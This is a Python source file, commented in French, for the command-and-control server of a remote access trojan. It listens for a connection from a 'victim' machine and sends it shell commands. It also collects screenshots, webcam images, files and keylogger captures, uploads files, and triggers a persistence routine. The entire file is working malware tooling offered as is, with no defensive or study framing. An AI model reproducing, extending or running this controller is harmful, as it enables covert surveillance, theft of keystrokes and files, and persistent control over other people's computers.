#!/usr/bin/python3

import socket
import json
import os

# Create a global variable for the socket and client connection
s = None
target = None
ip = None
reper = os.getcwd()


#la fonction pour etablire la connexion avec la machine vicitme
def connection():
    global s, target, ip

    # Create a new socket instance
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Configure the socket
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    # Bind the socket to an IP address and port
    s.bind(("192.168.1.35", 443))

    # Start listening for incoming connections
    s.listen(5)
    print("Listening for incoming connections...")

    # Accept an incoming connection
    target, ip = s.accept()
    print(f"Connected to {ip}")


#la fonction qui vas fair l'envoi des commandes vers la machine de la vicitme
def sending(command):
    # Convert the command to JSON format and send it
    json_data = json.dumps(command)
    target.send(json_data.encode())

#la fonction qui vas recever les resultats des commande executer dans la machine de la vicitme
def receive():
    json_data = ""
    while True:
        try:
            # Receive data from the target in chunks
            chunk = target.recv(4096).decode('utf-8', errors='replace')
            if not chunk:
                break
            json_data += chunk
            return json.loads(json_data)
        except json.JSONDecodeError:
            continue


#la fonction global qui possede les appelles aux fonction declarer dans le haut + possede les fonctionaliter de trojan ...
def shell():
    global reper
    try:
        while True:
            #un simple affichage 
            command = input(f"* Shell#{ip} ==> : ")
            
            #la commande pour quite le shell    
            if command.lower() in ["exit", "quit"]:
                sending(command)
                print("Command received to end connection.")
                break
            
            #la commande pour savoire votre emplacemment dans la machine de la victime    
            elif command.startswith("cd "):  # Gestion des commandes cd
                sending(command)
                response = receive()
                print(response)
                continue
            
             #la commande pour puise fair changer le repertoire dans la machine de la vicitime   
            elif command.strip() == "cd":  # Vérifier le répertoire courant
                sending(command)
                response = receive()  # Recevoir le répertoire courant
                reper=response
                print(f"Current directory: {response}")
                continue
            
            #la commande pour puise fair une capture d'ecran sur la machine de ma vicitme
            elif command.strip() == "screenshot":
                sending(command)
                response = receive()
                print(response.get("status"))
                if response.get("status") == "success":
                    with open("C:\\Users\\HP\\OneDrive\\Desktop\\screenshot.png", "wb") as f:
                        f.write(bytes.fromhex(response["data"]))
                    print("Screenshot saved as screenshot.png")
                else:
                    print(f"Error taking screenshot: {response.get('message')}")
                continue
            
            #la commande pour puisse telecharger des fichier ou des dossier depuis la machine de la vicitme
            elif command.startswith("download "):
                sending(command)
                response = receive()

                # Chemin de stockage
                save_dir = r"C:\Users\HP\Downloads"

                if response.get("status") == "success":
                    # Extraire le nom du fichier demandé
                    filename = os.path.basename(command[9:].strip())
                    filepath = os.path.join(save_dir, filename)

                # Sauvegarder le fichier directement dans le répertoire Downloads
                    with open(filepath, "wb") as f:
                        f.write(bytes.fromhex(response["data"]))
        
                    print(f"File azz downloaded successfully: {filepath}")
                else:
                    print(f"Error downloading file: {response.get('message')}")
                continue
            
           #la commande pour puise uploader des fichier dans la machine de vicitime 
            elif command.startswith("upload "):
                try:
                # Récupérer le chemin spécifié par l'utilisateur
                    filepath = command.split(" ", 1)[1]
        
                # Ajouter le répertoire courant s'il s'agit d'un chemin relatif
                    if not os.path.isabs(filepath):
                        filepath = os.path.join(reper, filepath)
                    else: 
                        filepath = filename
                # Debug : Afficher le chemin réel utilisé
                    print(f"Attempting to upload file from: {filepath}")
        
                # Vérifier si le fichier existe
                    if not os.path.exists(filepath):
                        print(f"File '{filepath}' does not exist.")
                        continue
        
        # Lire le fichier
                    with open(filepath, "rb") as f:
                        filedata = f.read().hex()
        
                    # Envoyer au client
                    sending(f"upload {filepath} {filedata}")
                    response = receive()
                    print(response)
                except Exception as e:
                    print(f"Error uploading file: {str(e)}")
                continue
            
            elif command.strip() == "camera":
                sending(command)  # Send the camera command to the client
                response = receive()  # Receive the status message from the client
                if isinstance(response, dict) and response.get("status") == "success":
                    image_data = bytes.fromhex(response.get("data"))
                    image_path = "Victime_image.png"
                    with open("C:\\Users\\HP\\OneDrive\\Desktop\\Victime_image.png", "wb") as f:
                        f.write(image_data)
                    print(f"Image successfully saved as {image_path}.")
                else:
                    print(f"Failed to capture image: {response}")
                continue
            
            elif command.strip() == "keylogger start":
                # Envoi de la commande pour démarrer l'enregistrement des touches
                sending(command)
                response = receive()  # Réponse du client
                print(response)  # Afficher le message de statut
                continue
            
            elif command.strip() == "keylogger stop":
                sending(command)  # Envoyer la commande pour arrêter le keylogger
                response = receive()  # Réponse du client avec les données du fichier
                if isinstance(response, dict) and response.get("status") == "success":
                # Décoder les données hexadécimales et sauvegarder le fichier
                    file_data = bytes.fromhex(response.get("data"))
                    file_path = os.path.join(os.path.expanduser("~"), "Desktop", "keystrokes_received.txt")
                    with open(file_path, "wb") as f:
                        f.write(file_data)
                    print(f"Keystrokes file saved at: {file_path}")
                else:
                    print(f"Failed to receive keystrokes file: {response.get('message')}")
                    continue
            
            # Code côté serveur pour envoyer la commande persistance
            elif command.strip() == "persistance":
                sending(command)  # Envoyer la commande au client pour qu'il configure la persistance
                response = receive()  # Attendre la réponse du client (statut)
                print(response)  # Afficher si la persistance a été configurée avec succès
                continue




            # Envoyer d'autres commandes au client
            sending(command)
            response = receive()
            print(response)

    except KeyboardInterrupt:
        print("Interruption by user!")



# le main
if __name__ == "__main__":
    try:
        connection()
        shell()
    finally:
        # Ensure the socket and connection are properly closed
        if target:
            target.close()
        if s:
            s.close()
